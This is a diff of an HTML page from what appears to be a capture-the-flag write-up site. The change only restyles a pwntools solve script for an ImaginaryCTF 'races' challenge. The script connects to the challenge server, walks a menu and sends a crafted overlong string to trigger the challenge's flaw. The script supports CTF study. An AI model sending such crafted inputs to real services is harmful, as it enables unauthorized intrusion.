@@ -56,47 +56,32 @@
 <div>
     <img src="../imgs/imaginary/races4.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
 
-from pwn import *
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
 
-p=remote('chal.imaginaryctf.org',42016)
+<span style="color: #839496">p</span><span style="color: #586e75">=</span><span style="color: #839496">remote(</span><span style="color: #2aa198">'chal.imaginaryctf.org'</span><span style="color: #839496">,</span><span style="color: #2aa198">42016</span><span style="color: #839496">)</span>
 
-good = "ju5tneveeverl05e"
-bad =  'ju5tnEvEE' + 'vEE'*30
+<span style="color: #839496">good</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">"ju5tneveeverl05e"</span>
+<span style="color: #839496">bad</span> <span style="color: #586e75">=</span>  <span style="color: #2aa198">'ju5tnEvEE'</span> <span style="color: #586e75">+</span> <span style="color: #2aa198">'vEE'</span><span style="color: #586e75">*</span><span style="color: #2aa198">30</span>
 
-p.sendline('1')
-p.sendline('A')
-p.sendline('100')
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'A'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'100'</span><span style="color: #839496">)</span>
 
-p.sendline('1')
-p.sendline('B')
-p.sendline('200')
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'B'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'200'</span><span style="color: #839496">)</span>
 
-p.sendline('2')
-p.sendline(good)
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'2'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(good)</span>
 
-p.sendline('1')
-p.sendline('4')
-p.sendline(bad)
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'4'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(bad)</span>
 
-p.interactive()
-        </code>
-    </pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <br><br>
 
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
